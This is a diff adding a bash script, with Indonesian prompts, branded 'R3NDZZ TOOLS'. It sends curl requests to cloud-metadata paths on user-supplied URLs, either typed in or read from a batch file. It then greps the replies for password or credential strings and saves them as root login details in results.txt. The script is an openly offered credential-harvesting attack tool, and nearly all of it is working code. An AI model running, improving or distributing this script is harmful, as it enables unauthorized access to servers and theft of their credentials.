@@ -1,0 +1,148 @@
+#!/bin/bash
+
+# ==============================================
+# R3NDZZ TOOLS - METADATA FETCH VIA URL
+# [ Input URL -> Dapat Info Login ]
+# ==============================================
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+WHITE='\033[1;37m'
+NC='\033[0m'
+
+show_header() {
+    clear
+    echo -e "${RED}"
+    echo "    ╔════════════════════════════════════════════════╗"
+    echo "    ║        R3NDZZ TOOLS - METADATA FETCH          ║"
+    echo "    ║            [ Via URL Input ]                  ║"
+    echo "    ╚════════════════════════════════════════════════╝"
+    echo -e "${NC}"
+}
+
+# Fungsi untuk mengambil metadata dari URL
+fetch_from_url() {
+    local url=$1
+    local ip=$(echo $url | cut -d'/' -f3 | cut -d':' -f1)
+    
+    echo -e "\n${YELLOW}[•] Proses...${NC}"
+    sleep 1
+    
+    # Coba ambil dari berbagai endpoint metadata
+    endpoints=(
+        "$url/latest/user-data"
+        "$url/metadata/v1.json"
+        "$url/metadata/v1/user-data"
+        "$url/v1/user-data"
+        "$url/latest/meta-data"
+        "$url/latest/meta-data/public-ipv4"
+        "$url/latest/meta-data/local-ipv4"
+        "$url/latest/meta-data/hostname"
+    )
+    
+    for endpoint in "${endpoints[@]}"; do
+        response=$(curl -s -k -L --max-time 3 "$endpoint" 2>/dev/null)
+        if [ ! -z "$response" ] && [ "$response" != "404" ]* && [ "$response" != "403" ]*; then
+            echo -e "${GREEN}✅ Found: $endpoint${NC}"
+            metadata="$response"
+            break
+        fi
+    done
+    
+    echo -e "\n${CYAN}═══════════════════════════════════════════${NC}"
+    echo -e "${WHITE}🌐 IP: ${GREEN}$ip${NC}"
+    
+    # Coba ekstrak password dari metadata
+    if [ ! -z "$metadata" ]; then
+        pass=$(echo "$metadata" | grep -i "password\|pass\|credential" | head -1 | cut -d'=' -f2)
+        if [ -z "$pass" ]; then
+            pass="(tidak ditemukan di metadata)"
+        fi
+    else
+        pass="(gagal mengambil metadata)"
+    fi
+    
+    echo -e "${WHITE}🔑 Pass: ${YELLOW}$pass${NC}"
+    echo -e "${WHITE}👤 Login: ${GREEN}root@$ip${NC}"
+    echo -e "${CYAN}═══════════════════════════════════════════${NC}"
+    
+    # Simpan hasil
+    echo "$ip | $pass | root@$ip" >> results.txt
+    echo -e "\n${GREEN}✅ Hasil disimpan di results.txt${NC}"
+}
+
+# Main menu
+while true; do
+    show_header
+    
+    echo -e "${WHITE}╔════════════════════════════════════════╗${NC}"
+    echo -e "${WHITE}║            MENU UTAMA                  ║${NC}"
+    echo -e "${WHITE}╠════════════════════════════════════════╣${NC}"
+    echo -e "${WHITE}║                                        ║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[1]${NC} 🔍 Input URL Manual              ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[2]${NC} 📋 Baca dari file (urls.txt)     ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[3]${NC} 🗑️  Hapus hasil                   ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[0]${NC} 🚪 Keluar                        ${WHITE}║${NC}"
+    echo -e "${WHITE}║                                        ║${NC}"
+    echo -e "${WHITE}╚════════════════════════════════════════╝${NC}"
+    echo ""
+    
+    echo -ne "${YELLOW}➤ Pilih menu: ${NC}"
+    read menu
+    
+    case $menu in
+        1)
+            echo ""
+            echo -ne "${CYAN}Masukkan URL (contoh: http://192.168.1.1): ${NC}"
+            read url
+            
+            if [ ! -z "$url" ]; then
+                fetch_from_url "$url"
+            else
+                echo -e "${RED}❌ URL tidak boleh kosong!${NC}"
+            fi
+            ;;
+            
+        2)
+            if [ -f "urls.txt" ]; then
+                echo -e "\n${YELLOW}[•] Membaca file urls.txt...${NC}"
+                while read url; do
+                    if [ ! -z "$url" ]; then
+                        echo -e "\n${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+                        echo -e "${WHITE}Processing: $url${NC}"
+                        fetch_from_url "$url"
+                    fi
+                done < urls.txt
+                echo -e "\n${GREEN}✅ Semua URL selesai diproses!${NC}"
+            else
+                echo -e "${RED}❌ File urls.txt tidak ditemukan!${NC}"
+            fi
+            ;;
+            
+        3)
+            if [ -f "results.txt" ]; then
+                rm results.txt
+                echo -e "${GREEN}✅ Hasil dihapus!${NC}"
+            else
+                echo -e "${YELLOW}⚠️ Tidak ada file results.txt${NC}"
+            fi
+            ;;
+            
+        0)
+            echo -e "\n${GREEN}Terima kasih!${NC}"
+            exit 0
+            ;;
+            
+        *)
+            echo -e "${RED}Pilihan tidak valid!${NC}"
+            ;;
+    esac
+    
+    echo ""
+    echo -ne "${CYAN}Tekan Enter untuk lanjut...${NC}"
+    read
+done
